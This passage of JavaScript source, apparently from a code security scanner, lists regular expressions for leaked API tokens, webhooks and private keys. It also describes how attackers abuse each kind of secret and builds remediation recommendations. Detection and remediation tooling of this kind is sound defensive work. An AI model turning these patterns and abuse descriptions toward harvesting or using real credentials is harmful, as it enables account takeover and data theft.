  {n:"Slack API Token",r:"xox[baprs]-[0-9a-zA-Z]{10,48}",s:"h"},
  {n:"Slack Webhook URL",r:"https://hooks\\.slack\\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8,12}/[a-zA-Z0-9_]{24}",s:"h"},
  // Fixed: supports both discordapp.com (legacy) and discord.com (current)
  {n:"Discord Webhook URL",r:"https://(?:discordapp|discord)\\.com/api/webhooks/[0-9]+/[A-Za-z0-9\\-_]+",s:"m"},
  {n:"Microsoft Teams Webhook",r:"https://outlook\\.office\\.com/webhook/[A-Za-z0-9\\-@]+/IncomingWebhook/[A-Za-z0-9\\-]+/[A-Za-z0-9\\-]+",s:"m"},
  // Tightened: lookbehind/ahead prevent matching inside larger numeric sequences (timestamps, row IDs)
  {n:"Telegram Bot API Key",r:"(?<![0-9])[0-9]{8,10}:AA[0-9A-Za-z\\-_]{33}(?![A-Za-z0-9_])",s:"h"},
  {n:"FCM Server Key",r:"AAAA[a-zA-Z0-9_\\-]{7}:[a-zA-Z0-9_\\-]{140}",s:"h"},
  // Fixed: added required twilio context, SK+32hex alone is too generic
  {n:"Twilio API Key",r:"(?:twilio).{0,20}SK[0-9a-fA-F]{32}",s:"h"},
  // Email
  {n:"SendGrid API Key",r:"SG\\.[a-zA-Z0-9_\\-]{22}\\.[a-zA-Z0-9_\\-]{43}",s:"h"},
  // Fixed: added required mailchimp/mc context, bare 32hex+us12 matches MD5 hashes
  {n:"Mailchimp API Key",r:"(?:mailchimp|mc).{0,20}[0-9a-f]{32}-us[0-9]{1,2}",s:"m"},
  // ctx gate: key- prefix is extremely generic; only report when "mailgun" appears on the same line
  {n:"Mailgun API Key",r:"key-[0-9a-zA-Z]{32}",s:"h",ctx:/mailgun/i},
  // E-commerce
  {n:"Shopify Access Token",r:"shpat_[a-fA-F0-9]{32}",s:"c"},
  {n:"Shopify Shared Secret",r:"shpss_[a-fA-F0-9]{32}",s:"h"},
  {n:"Shopify Custom App Token",r:"shpca_[a-fA-F0-9]{32}",s:"h"},
  {n:"Shopify Private App Token",r:"shppa_[a-fA-F0-9]{32}",s:"h"},
  // Cryptographic Keys
  {n:"RSA Private Key",r:"-----BEGIN RSA PRIVATE KEY-----",s:"c"},
  {n:"DSA Private Key",r:"-----BEGIN DSA PRIVATE KEY-----",s:"c"},
  {n:"EC Private Key",r:"-----BEGIN EC PRIVATE KEY-----",s:"c"},
  {n:"PGP Private Key Block",r:"-----BEGIN PGP PRIVATE KEY BLOCK-----",s:"c"},
  {n:"OpenSSH Private Key",r:"-----BEGIN OPENSSH PRIVATE KEY-----",s:"c"},
  // Monitoring
  {n:"New Relic Admin API Key",r:"NRAA-[a-f0-9]{27}",s:"h"},
  {n:"New Relic Insights Key",r:"NRI[IQ]-[A-Za-z0-9\\-_]{32}",s:"h"},
  {n:"New Relic REST API Key",r:"NRRA-[a-f0-9]{42}",s:"h"},
  // Fixed: requires sonarqube/sonar_token variable name context, not just "sonar" near any SHA1
  {n:"SonarQube Token",r:"(?:SONAR(?:_TOKEN|QUBE)|sonar(?:_token|qube)).{0,30}[0-9a-f]{40}",s:"m"},
  // Social / Advertising
  {n:"Facebook Access Token",r:"EAACEdEose0cBA[0-9A-Za-z]+",s:"h"},
  // Artifact Repositories
  {n:"PyPI Upload Token",r:"pypi-AgEIcHlwaS5vcmc[A-Za-z0-9\\-_]{50,1000}",s:"h"},
  // Automation / Webhooks
  {n:"Zapier Webhook",r:"https://(?:www\\.)?hooks\\.zapier\\.com/hooks/catch/[A-Za-z0-9]+/[A-Za-z0-9]+/",s:"m"},
  // Database / Infrastructure
  // ctx gate: JDBC URLs in docs/test configs without credentials are not findings; require @ or password= evidence
  {n:"Database Connection String",r:"jdbc:[a-z:]+://[A-Za-z0-9\\.\\-_:;=/@?,&]+",s:"h",ctx:/@|password=|passwd=|pwd=/i},
  // Downgraded to medium; scanner also skips localhost/example hosts (see scanCredentials)
  {n:"Password in URL",r:"[a-zA-Z]{3,10}://[^/\\s:@]{3,20}:[^/\\s:@]{3,20}@.{1,100}[\"'\\s]",s:"m"},
  {n:"WordPress Secret Key",r:"define(.{0,20})?(DB_PASSWORD|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|AUTH_SALT|NONCE_KEY).{0,20}['\"].{10,120}['\"]",s:"h"},
  {n:"Cloudinary Credentials",r:"cloudinary://[0-9]+:[A-Za-z0-9\\-_\\.]+@[A-Za-z0-9\\-_\\.]+",s:"h"},
  // Link Shorteners / Other
  // ctx gate: R_ is a common prefix in React/Redux/Ruby; only report when "bitly" or "bit.ly" is on same line
  {n:"Bitly Access Token",r:"R_[0-9a-f]{32}",s:"m",ctx:/bitly|bit\.ly/i},
  // Lowered to medium: JWTs appear legitimately in tests/docs
  // ctx gate: only report when the line contains a storage/assignment keyword, filters standalone examples in comments
  {n:"Exposed JWT Token",r:"eyJ[a-zA-Z0-9]{10,}\\.eyJ[a-zA-Z0-9]{10,}\\.[a-zA-Z0-9_\\-]{10,}",s:"m",ctx:/token|jwt|auth|bearer|secret|key|credential|sign|=|:/i},
];
const CRED_PREFILTER=/AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA|da2-[a-z0-9]{10}|amzn\.mws|AIza|ya29\.[0-9A-Za-z]{15}|googleusercontent|[Hh][Ee][Rr][Oo][Kk][Uu]|dt0[A-Za-z][0-9]{2}\.|ghp_|gho_|ghu_|ghs_|ghr_|sk_live_|sk_test_|rk_live_|access_token\$production|sq0atp|sq0csp|xox[baprs]-[0-9a-zA-Z]{8}|hooks\.slack\.com|discord(?:app)?\.com\/api\/webhooks|outlook\.office\.com\/webhook|[0-9]{8,10}:AA[0-9A-Za-z]|AAAA[a-zA-Z0-9_-]{7}:|twilio|SG\.[a-zA-Z0-9_-]{15}|mailchimp|key-[0-9a-zA-Z]{20}|shpat_|shpss_|shpca_|shppa_|-----BEGIN .*(PRIVATE|PGP)|NRAA-|NRII-|NRIQ-|NRRA-|EAACEdEose0cBA|pypi-AgEIcH|hooks\.zapier\.com|jdbc:|cloudinary:\/\/|R_[0-9a-f]{20}|eyJ[a-zA-Z0-9]{10,}\.eyJ/i;
const SECRET_IMPACT_MAP={
  "AWS Access Key ID":"Provides programmatic access to AWS resources. With the paired secret key, an attacker can enumerate S3 buckets, exfiltrate databases, spin up EC2 instances for cryptomining, or pivot to any service the role permits. If the key belongs to an admin role, this is full cloud account takeover.",
  "AWS AppSync GraphQL Key":"Allows unauthenticated queries and mutations against your AppSync GraphQL API. Attackers can read application data, trigger mutations to corrupt records, or enumerate the schema to map further attack surface.",
  "Amazon MWS Auth Token":"Grants access to Amazon Marketplace Web Service. An attacker can read order data, product listings, customer information, and financial reports, or submit fraudulent orders on behalf of your seller account.",
  "Google API Key":"Provides access to Google APIs depending on enabled services and restrictions. Unrestricted keys can be used to run up large bills via Maps/YouTube API, exfiltrate data, or abuse quotas allocated to your project.",
  "Google OAuth Access Token":"A token granting access to a user's Google account for the scopes it was issued with. Can be used to read Gmail, Drive files, Calendar events, or other Google Workspace data until the token expires.",
  "Google OAuth Client ID":"Identifies a registered Google OAuth app. Combined with the client secret, enables impersonating your app, intercepting authorization codes and stealing user access tokens through redirect-URI attacks.",
  "GCP Service Account Credential":"Indicates a GCP service account JSON key file is embedded in the codebase. Service account keys grant persistent, non-expiring API access with all permissions assigned to that account, often equivalent to full project access across Storage, BigQuery, Cloud Run, and more.",
  "Heroku API Key":"Full access to the Heroku account. Attackers can read environment variables (exposing other secrets), deploy malicious code to running dynos, access attached database credentials, or delete the entire application.",
  "Dynatrace Token":"Grants access to Dynatrace monitoring data, traces, infrastructure metrics, and deployment events. Attackers can map your internal architecture, identify dependencies, or abuse APIs to inject false monitoring data.",
  "GitHub Personal Access Token":"Provides git clone/push access and GitHub API access for all repositories accessible to the token owner. Attackers can exfiltrate source code, inject malicious commits, read CI/CD secrets stored as repository variables, or disable branch protections.",
  "GitHub OAuth Access Token":"OAuth token for GitHub API. Depending on scopes, allows reading private repositories, accessing organization data, or performing actions as the authenticated user.",
  "GitHub App Token":"Short-lived installation token for a GitHub App scoped to repository read/write, issues, PRs, or deployments. Can be used to inject code into repositories or manipulate CI/CD workflows.",
  "GitHub Refresh Token":"Long-lived token used to generate new GitHub OAuth access tokens. Enables persistent unauthorized access to the user's GitHub account without the original OAuth flow.",
  "Stripe Secret Key":"Full access to your Stripe account: read all customer data and stored payment methods, create charges, issue refunds, access bank account details for payouts. A leaked live key is a direct financial incident and PCI DSS violation.",
  "Stripe Restricted Key":"A scoped Stripe API key, still dangerous depending on configuration. May allow reading customer data, creating charges, or managing subscriptions based on assigned permissions.",
  "Stripe Test Key":"Access to Stripe test mode. Allows enumerating test customers and payment structures, which mirrors production architecture and reveals implementation details useful for attacking the live environment.",
  "PayPal Braintree Access Token":"Production access token for Braintree payment processing. Allows processing charges, accessing stored payment methods, and reading customer transaction history in your Braintree merchant account.",
  "Square Access Token":"Production access to a Square merchant account: read transaction history, customer data, and inventory, or process charges against stored customer payment methods.",
  "Square OAuth Secret":"OAuth application secret for Square. Allows generating access tokens for any Square merchant who authorized your application, providing access to their transaction data and payment processing.",
  "Slack API Token":"Allows reading messages from all channels accessible to the token, posting messages as the bot/user, listing workspace members and profiles, and downloading file uploads. Slack conversations routinely contain other credentials, business decisions, and sensitive discussions.",
  "Slack Webhook URL":"Allows posting arbitrary messages to a specific Slack channel without authentication. Can be used for phishing (impersonating a trusted bot), injecting malicious links, or flooding the channel.",
  "Discord Webhook URL":"Allows posting arbitrary messages to a Discord channel. Attackers can impersonate legitimate bots, send phishing links to community members, or disrupt communication.",
  "Microsoft Teams Webhook":"Allows injecting messages into a Teams channel, enabling impersonation of authorized bots, sending phishing links to employees, or disrupting internal communications.",
  "Telegram Bot API Key":"Full control of a Telegram bot: send messages to any user who has started the bot, read all incoming messages. If the bot has group admin permissions, can read all group messages and manage members.",
  "FCM Server Key":"Legacy Firebase Cloud Messaging key. Allows sending push notifications to every device registered with your Firebase project, enabling large-scale phishing notifications to all app users.",
  "Twilio API Key":"Access to Twilio: send SMS/voice calls charged to your account, read message history (including OTP codes), and enumerate phone numbers, enabling SMS phishing or account takeover via intercepted 2FA codes.",
  "SendGrid API Key":"Depending on permissions: send email as your domain (large-scale phishing), read all subscriber/contact lists (customer PII exfiltration), or modify email templates and sender authentication settings.",
  "Mailchimp API Key":"Access to Mailchimp: read all subscriber lists (exfiltrating customer PII), send campaigns to all subscribers, or modify list data. Customer email lists are high-value targets for spammers and phishing campaigns.",
  "Mailgun API Key":"Allows sending email through Mailgun on your verified domain, enabling phishing emails that appear to originate from your organization. Also allows reading logs of all sent/received messages.",
  "Shopify Access Token":"Full API access to a Shopify store: read/write products, orders, customers, and financial data. Attackers can exfiltrate the entire customer database, modify prices, create discount codes, or read stored payment tokens.",
  "Shopify Shared Secret":"Used to verify webhook authenticity. A compromised shared secret allows forging webhook payloads and potentially extracting merchant access tokens through partner app impersonation.",
  "Shopify Custom App Token":"API access token with configured scopes, typically orders, customers, and products. Enables full store data exfiltration or order manipulation.",
  "Shopify Private App Token":"Legacy Shopify private app credential providing scoped API access equivalent in risk to the custom app token.",
  "RSA Private Key":"The private half of an RSA key pair. Used for SSH access: allows passwordless login to any server trusting the corresponding public key. Also used for TLS/code signing, allowing server impersonation or signing of malicious software.",
  "DSA Private Key":"Private key used for SSH authentication, allows login to any server that trusts the corresponding public key. DSA keys are also considered cryptographically weak by modern standards.",
  "EC Private Key":"Elliptic Curve private key used in ECDSA for SSH, TLS, JWT signing (ES256/ES384), and cryptocurrency wallets. A leaked EC key compromises all uses of the corresponding public key.",
  "PGP Private Key Block":"PGP/GPG private key. Allows decrypting all messages encrypted to this key and signing messages as the key owner, enabling impersonation in encrypted communications and access to confidential correspondence.",
  "OpenSSH Private Key":"Private key for SSH authentication. Allows login to any server configured to accept this key. Modern OpenSSH keys are also used for signing git commits.",
  "New Relic Admin API Key":"Administrative access to New Relic: read all APM traces/errors, modify alert policies, and access application logs, revealing detailed internal architecture to an attacker.",
  "New Relic Insights Key":"Allows inserting arbitrary data into New Relic NRDB. Attackers can inject false metrics to mask attacks, trigger false alerts to distract responders, or pollute monitoring dashboards.",
  "New Relic REST API Key":"REST API access to New Relic account data: enumerate applications, servers, alerts, and deployments, providing a complete map of your monitored infrastructure.",
  "SonarQube Token":"Access to SonarQube code analysis results. Exposes all identified vulnerabilities in your codebase, including unpatched ones, giving attackers a prioritized list of weaknesses to exploit.",
  "Facebook Access Token":"Allows actions on Facebook as the authenticated user/page: reading messages, posting content, accessing friend lists, and reading profile data. Page tokens additionally allow managing ads and accessing page insights.",
  "PyPI Upload Token":"Allows publishing packages to PyPI. An attacker can release malicious versions of your package, compromising all users who install or update it, a classic supply chain attack.",
  "Zapier Webhook":"Triggers a Zapier automation workflow. Depending on the zap, this could send emails, write to databases, create CRM records, or trigger downstream actions, all without authentication.",
  "Database Connection String":"Complete database credentials including hostname, username, and password. Allows direct database access, full data exfiltration, modification, or deletion, bypassing all application-layer controls.",
  "Password in URL":"Credentials embedded in a URL. Exposed in browser history, server access logs, proxy logs, and Referer headers. Allows direct authentication as the credential owner.",
  "WordPress Secret Key":"WordPress secret keys/salts used to generate authentication cookies and nonces. Knowledge of these keys allows forging valid WordPress authentication cookies, bypassing login without any user's password.",
  "Cloudinary Credentials":"API credentials for Cloudinary media management. Allows uploading arbitrary files (including malicious content) to your CDN, deleting or transforming existing media, or exhausting your storage/bandwidth quota.",
  "Bitly Access Token":"Access to Bitly link shortening: create short links (for phishing), read click analytics, or modify existing short URLs, potentially redirecting users who have bookmarked your links.",
  "Exposed JWT Token":"A signed JWT is hardcoded in code. If long-lived or non-expiring, an attacker can reuse it directly to authenticate as the token subject. The payload also reveals claims, roles, and internal identifiers used by the application.",
};

function generateRecs(findings,routes,sinks,sources,logicVulns,supplyChain,components){const recs=[];let id=1;
  // ── Chained exploit paths get their own top category ───────────────────────
  for(const f of findings.filter(x=>x.parser==='CHAIN'&&!x.isSanitized)){
    const fix=FIXES[f.vuln]||{p:"Critical",f:"Address both underlying vulnerabilities immediately.",c:"// See individual findings for remediation steps"};
    recs.push({id:id++,category:"Exploit Chain",severity:f.severity,priority:"Critical",
      title:`⛓ ${f.vuln}`,
      description:f.chainDescription||`Two vulnerabilities chain into a critical exploit path: ${f.vuln}`,
      file:f.file,lines:'Multiple',recommendation:fix.f,
      codeExample:fix.c,cwe:f.cwe,stride:f.stride,testable:false,vuln:f.vuln,
      param:'(chained)',endpoint:routes.find(r=>r.file===f.file?.split(' -> ')[0])?.path||'/api/endpoint',
      method:'any'});
  }
  // ── Stored taint / second-order injection ──────────────────────────────────
  for(const f of findings.filter(x=>x.parser==='STORED_TAINT'&&!x.isSanitized)){
    const fix=FIXES['Stored XSS / Second-Order Injection']||{p:"High",f:"Sanitize stored content before rendering.",c:"res.send(escapeHtml(user.bio));"};
    recs.push({id:id++,category:"Stored Taint / Second-Order",severity:f.severity,priority:fix.p,
      title:`Stored XSS — ${f.source.variable} written in ${f.source.file.split('/').pop()}, rendered in ${f.sink.file?.split('/').pop()||f.file.split(' -> ').pop().split('/').pop()}`,
      description:`Field '${f.source.variable}' is written with user-controlled data and later rendered without escaping. Unlike reflected XSS, stored XSS fires for every user who views the page.`,
      file:f.file,lines:`${f.source.line}-${f.sink.line}`,recommendation:fix.f,
      codeExample:`// Write side (${f.source.file.split('/').pop()}:${f.source.line}):\n// ${f.source.snippet}\n\n// Render side — add escaping:\n${fix.c}`,
      cwe:f.cwe,stride:f.stride,testable:true,vuln:f.vuln,
      param:f.source.variable||'field',endpoint:routes.find(r=>r.file===f.file?.split(' -> ').pop())?.path||'/api',
      method:'get'});
  }
  for(const f of findings.filter(x=>!x.isSanitized&&x.parser!=='CHAIN'&&x.parser!=='STORED_TAINT')){const fix=FIXES[f.vuln]||NEW_FIXES?.[f.vuln]||{p:"Medium",f:"Sanitize input.",c:"// Add validation"};const cat=f.parser==='ADV_STRUCTURAL'?'Structural Pattern':f.parser==='SESSION_TAINT'?'Session Taint':f.isCrossFile?"Cross-File Exploit":"Exploit Path";const confTag=f.exploitabilityLabel?` [${f.exploitabilityLabel}]`:'';recs.push({id:id++,category:cat,severity:f.severity,priority:fix.p,title:`${f.vuln} - ${f.source.label} to ${f.sink.type}${confTag}`,description:`Untrusted input from ${f.source.label} reaches output ${f.sink.type} unsanitized.${f.guards&&f.guards.length?' (guards detected: '+f.guards.join(', ')+')':''}${f.reachable===false?' NOTE: handler appears unreachable from any route.':''}${f.sanitizerMismatch?' ⚠ Sanitizer present but ineffective against this vuln class.':''}`,file:f.file,lines:`${f.source.line}-${f.sink.line}`,recommendation:fix.f,codeExample:`// File: ${f.file}\n// Input: line ${f.source.line} | Output: line ${f.sink.line}\n// ${f.source.snippet}\n// ${f.sink.snippet}\n\n${fix.c}`,cwe:f.cwe,stride:f.stride,testable:true,vuln:f.vuln,param:f.source.variable||"input",endpoint:routes.find(r=>r.file===f.file?.split(" -> ")[0])?.path||"/api/endpoint",method:(routes.find(r=>r.file===f.file?.split(" -> ")[0])?.method||"GET").toLowerCase(),exploitabilityScore:f.exploitabilityScore,exploitabilityLabel:f.exploitabilityLabel,reachable:f.reachable,routeRooted:f.routeRooted,guards:f.guards,evidence:f.evidence});}
  for(const r of routes.filter(x=>!x.hasAuth&&x.method!=="GET"&&x.method!=="OPTIONS"))recs.push({id:id++,category:"Authentication Exposure",severity:"high",priority:"High",title:`No Auth: ${r.method} ${r.path}`,description:`Fields: ${Object.keys(r.classifiedFields||{}).join(", ")||"none classified"}`,file:r.file,lines:`${r.line}`,recommendation:"Add auth middleware.",codeExample:`// File: ${r.file}:${r.line}\nrouter.${r.method.toLowerCase()}('${r.path}', authMiddleware, handler);`,cwe:"CWE-306",stride:"Spoofing",dataClasses:r.classifications});
  for(const r of routes.filter(x=>x.classifications.length>0)){const labels=r.classifications.map(c=>DATA_CLASSES[c]?.label).join(", ");const fields=Object.keys(r.classifiedFields||{});recs.push({id:id++,category:"Encryption Exposure",severity:"high",priority:"High",title:`${labels} on ${r.method} ${r.path}`,description:`Fields: ${fields.join(", ")||"detected via parameters"}`,file:r.file,lines:`${r.line}`,recommendation:`Enforce TLS. Encrypt at rest. No plaintext logging. Cache-Control: no-store.`,codeExample:`// File: ${r.file}:${r.line}\n// Fields: ${fields.join(", ")}\nres.set('Cache-Control','no-store');`,cwe:"CWE-311",stride:"Information Disclosure",dataClasses:r.classifications});}
  for(const r of routes.filter(x=>x.classifications.includes("PCI")))recs.push({id:id++,category:"PCI Compliance",severity:"critical",priority:"Critical",title:`PCI: ${r.method} ${r.path}`,description:`PCI fields: ${Object.keys(r.classifiedFields||{}).filter(f=>classifyField(f).includes("PCI")).join(", ")}`,file:r.file,lines:`${r.line}`,recommendation:"Never store CVV. Mask PAN. Tokenize.",codeExample:`// File: ${r.file}:${r.line}\nconst masked=pan.replace(/.(?=.{4})/g,'*');`,cwe:"CWE-312",stride:"Information Disclosure",dataClasses:["PCI"]});
  const unsanitizedSources=new Map();for(const f of findings.filter(x=>!x.isSanitized)){const key=`${f.source.label}:${f.source.file}:${f.source.line}`;if(!unsanitizedSources.has(key))unsanitizedSources.set(key,{source:f.source,sinkTypes:new Set(),vulns:new Set()});unsanitizedSources.get(key).sinkTypes.add(f.sink.type);unsanitizedSources.get(key).vulns.add(f.vuln);}
  for(const[,entry]of unsanitizedSources){const src=entry.source;const sinkList=[...entry.sinkTypes].join(", ");const vulnList=[...entry.vulns].join(", ");const fix=entry.vulns.has("SQL Injection")?"parameterized queries":entry.vulns.has("XSS")||entry.vulns.has("Reflected XSS")?"output encoding (escapeHtml)":entry.vulns.has("Command Injection")?"input allowlisting":"input validation";recs.push({id:id++,category:"Input Sanitization",severity:"high",priority:"High",title:`Unsanitized: ${src.label} (${src.file.split("/").pop()}:${src.line})`,description:`This input reaches: ${sinkList}. Potential: ${vulnList}.`,file:src.file,lines:`${src.line}`,recommendation:`Add ${fix} to ${src.label} before it reaches ${sinkList}.`,codeExample:`// File: ${src.file}:${src.line}\n// Current: ${src.snippet}\n// Reaches: ${sinkList}\n\n// Add validation:\nconst validated = ${fix==="parameterized queries"?"// Use $1 placeholders":fix==="output encoding (escapeHtml)"?`escapeHtml(${src.variable||"input"})`:`validate(${src.variable||"input"})`};`,cwe:"CWE-20",stride:"Tampering"});}
  const piiRoutes=routes.filter(r=>r.classifications.includes("PII"));const phiRoutes=routes.filter(r=>r.classifications.includes("PHI"));
  if(piiRoutes.length)recs.push({id:id++,category:"Data Privacy (ROPA)",severity:"medium",priority:"Medium",title:`${piiRoutes.length} endpoints process PII`,description:`PII fields: ${[...new Set(piiRoutes.flatMap(r=>Object.keys(r.classifiedFields||{})))].join(", ")}`,file:"Multiple",lines:"N/A",recommendation:"Document processing purpose, legal basis, retention, third-party sharing per GDPR Art.30.",codeExample:`// PII Endpoints:\n${piiRoutes.map(r=>`// ${r.method} ${r.path} - ${Object.keys(r.classifiedFields||{}).join(", ")} (${r.file}:${r.line})`).join("\n")}`,cwe:"GDPR-Art30",stride:"Information Disclosure"});
  if(phiRoutes.length)recs.push({id:id++,category:"Data Privacy (ROPA)",severity:"high",priority:"High",title:`${phiRoutes.length} endpoints process PHI`,description:`PHI fields: ${[...new Set(phiRoutes.flatMap(r=>Object.keys(r.classifiedFields||{})))].join(", ")}`,file:"Multiple",lines:"N/A",recommendation:"Verify HIPAA BAA. Implement minimum necessary. Encrypt PHI at rest (AES-256).",codeExample:`// PHI Endpoints:\n${phiRoutes.map(r=>`// ${r.method} ${r.path} - ${Object.keys(r.classifiedFields||{}).join(", ")} (${r.file}:${r.line})`).join("\n")}`,cwe:"HIPAA-164.312",stride:"Information Disclosure"});
  const allCollected=[...new Set(routes.flatMap(r=>r.params))];const sinkFields=[...new Set(sinks.flatMap(s=>s.usedVars))];const unused=allCollected.filter(f=>!sinkFields.includes(f)&&classifyField(f).length>0);
  if(unused.length)recs.push({id:id++,category:"Data Minimization",severity:"medium",priority:"Medium",title:`${unused.length} classified fields collected but unused`,description:`Fields: ${unused.join(", ")}`,file:"Multiple",lines:"N/A",recommendation:`Remove: ${unused.map(f=>`${f} (${classifyField(f).join("/")})`).join(", ")}`,codeExample:`// Unused classified fields:\n${unused.map(f=>`// ${f} - ${classifyField(f).join("/")} - collected, no downstream usage`).join("\n")}`,cwe:"GDPR-Art5",stride:"Information Disclosure"});
  const outbound=sinks.filter(s=>s.type==="Outbound HTTP");const classifiedOutbound=outbound.filter(s=>routes.some(r=>r.file===s.file&&r.classifications.length>0));
  if(classifiedOutbound.length)recs.push({id:id++,category:"Cross-Border Transfer",severity:"high",priority:"High",title:`${classifiedOutbound.length} outbound calls in classified-data files`,description:`Verify destinations have proper data processing agreements.`,file:"Multiple",lines:classifiedOutbound.map(s=>`${s.file}:${s.line}`).join(", "),recommendation:"Audit destinations. Ensure SCCs or adequacy decisions. Never send raw PII externally.",codeExample:`// Outbound calls:\n${classifiedOutbound.map(s=>`// ${s.file}:${s.line} - ${s.snippet}`).join("\n")}`,cwe:"GDPR-Ch5",stride:"Information Disclosure"});
  if(logicVulns)for(const lv of logicVulns)recs.push({id:id++,category:"Logic Vulnerability",severity:lv.severity,priority:lv.severity==="critical"?"Critical":lv.severity==="high"?"High":"Medium",title:`${lv.vuln} (${lv.file.split("/").pop()}:${lv.line})`,description:`${lv.snippet}`,file:lv.file,lines:`${lv.line}`,recommendation:lv.fix,codeExample:`// File: ${lv.file}:${lv.line}\n// Found: ${lv.snippet}\n\n${lv.code}`,cwe:lv.cwe,stride:lv.stride});
  if(supplyChain)for(const sc of supplyChain){
    if(sc.type==="vulnerable_dep"){
      const isDevUnreachable=sc.reachable===false&&sc.scope==="optional";
      const effSev=isDevUnreachable&&sc.severity==="high"?"medium":isDevUnreachable&&sc.severity==="critical"?"high":sc.severity;
      const effPri=effSev==="critical"?"Critical":effSev==="high"?"High":"Medium";
      const reachTag=isDevUnreachable?"[Dev-only, not reachable in app code] ":"";
      const exploitNote=sc.hasKnownExploit?"⚠ Known exploit available. ":"";
      const cveStr=sc.cveAliases&&sc.cveAliases.length?` (${sc.cveAliases[0]})`:"";
      const fixRec=sc.fixedVersions&&sc.fixedVersions.length?`Upgrade ${sc.name} to ${sc.fixedVersions[0]}.`:`Update ${sc.name} to the latest patched version.`;
      const fixCmd=sc.ecosystem==="pypi"?`pip install --upgrade ${sc.name}${sc.fixedVersions&&sc.fixedVersions.length?`==${sc.fixedVersions[0]}`:""}`:sc.fixedVersions&&sc.fixedVersions.length?`npm install ${sc.name}@${sc.fixedVersions[0]}`:`npm update ${sc.name}`;
      recs.push({id:id++,category:"Supply Chain",severity:effSev,priority:effPri,title:`${reachTag}Vulnerable: ${sc.name}@${sc.version}${cveStr}`,description:`${exploitNote}${sc.description||sc.advisory} (affected: ${sc.range})`,file:sc.file,lines:"N/A",recommendation:`${fixRec} Run: ${fixCmd}`,codeExample:`// File: ${sc.file}\n// Current: "${sc.name}": "${sc.version}"\n// Advisory: ${sc.osvId||sc.advisory}${cveStr}\n// Affected range: ${sc.range}${sc.fixedVersions&&sc.fixedVersions.length?`\n// Fixed in: ${sc.fixedVersions[0]}`:""}${sc.hasKnownExploit?"\n// ⚠ Known exploit available":""}\n\n// Fix: ${fixCmd}`,cwe:"CWE-1395",stride:"Tampering"});
    }
    if(sc.type==="unpinned_dep")recs.push({id:id++,category:"Supply Chain",severity:"medium",priority:"Medium",title:`Unpinned: ${sc.name}@${sc.version}`,description:`Dependency uses wildcard/latest version. Pin to specific version.`,file:sc.file,lines:"N/A",recommendation:`Pin ${sc.name} to an exact version in package.json.`,codeExample:`// BEFORE\n"${sc.name}": "${sc.version}"\n\n// AFTER\n"${sc.name}": "^1.2.3"  // pin to specific range`,cwe:"CWE-1395",stride:"Tampering"});
    if(sc.type==="no_lockfile")recs.push({id:id++,category:"Supply Chain",severity:"high",priority:"High",title:"No lock file detected",description:"Dependency manifest found but no lock file. Builds are non-deterministic and vulnerable to supply chain attacks.",file:sc.file,lines:"N/A",recommendation:"Generate and commit a lock file: npm install (creates package-lock.json) or pip freeze > requirements.txt",codeExample:"# Generate lock file:\nnpm install          # creates package-lock.json\nyarn install         # creates yarn.lock\npip freeze > req.txt # pins Python deps",cwe:"CWE-1395",stride:"Tampering"});
    if(sc.type==="cdn_no_integrity")recs.push({id:id++,category:"Supply Chain",severity:"medium",priority:"Medium",title:`CDN without SRI: ${sc.file.split("/").pop()}:${sc.line}`,description:`Script loaded from CDN without Subresource Integrity hash. A compromised CDN can inject malicious code.`,file:sc.file,lines:`${sc.line}`,recommendation:"Add integrity and crossorigin attributes to CDN script tags.",codeExample:`// BEFORE\n${sc.snippet}\n\n// AFTER - add integrity hash\n<script src="..." integrity="sha384-..." crossorigin="anonymous"><\/script>\n\n// Generate hash: openssl dgst -sha384 -binary <file> | openssl base64 -A`,cwe:"CWE-830",stride:"Tampering"});
    if(sc.type==="dynamic_require")recs.push({id:id++,category:"Supply Chain",severity:"medium",priority:"Medium",title:`Dynamic require: ${sc.file.split("/").pop()}:${sc.line}`,description:`Dynamic module loading can enable dependency confusion attacks.`,file:sc.file,lines:`${sc.line}`,recommendation:"Use static require/import statements. If dynamic loading is needed, allowlist valid module names.",codeExample:`// File: ${sc.file}:${sc.line}\n// Found: ${sc.snippet}\n\n// Use static imports or validate:\nconst ALLOWED = ['moduleA', 'moduleB'];\nif (!ALLOWED.includes(name)) throw new Error('Invalid');`,cwe:"CWE-829",stride:"Tampering"});
  }
  // Deprecated dependencies
  const seenDeprecated=new Set();
  for(const comp of (components||[]).filter(c=>c.isDeprecated)){
    const dk=`${comp.ecosystem}:${comp.name}`;
    if(seenDeprecated.has(dk))continue;
    seenDeprecated.add(dk);
    const latestNote=comp.latestVersion?` The current maintained release is v${comp.latestVersion}.`:'';
    const fixCmd=comp.ecosystem==='pypi'
      ?`pip uninstall ${comp.name}\n# find replacement at https://pypi.org/search/\npip install <replacement>`
      :`npm uninstall ${comp.name}\n# find replacement at https://www.npmjs.com\nnpm install <replacement>`;
    recs.push({id:id++,category:"Deprecated Dependency",severity:"medium",priority:"Medium",
      title:`Deprecated: ${comp.name}@${comp.version}`,
      description:`${comp.deprecationMessage||'This package has been officially deprecated by its publisher.'}${latestNote} Deprecated packages do not receive security patches.`,
      file:comp.filePath||'package manifest',lines:'N/A',
      recommendation:`Replace ${comp.name} with an actively maintained alternative. Remove it from your dependency manifest.`,
      codeExample:fixCmd,
      cwe:"CWE-1104",stride:"Tampering",
      ecosystem:comp.ecosystem,packageName:comp.name,packageVersion:comp.version,
      latestVersion:comp.latestVersion||''});
  }
  return recs;}

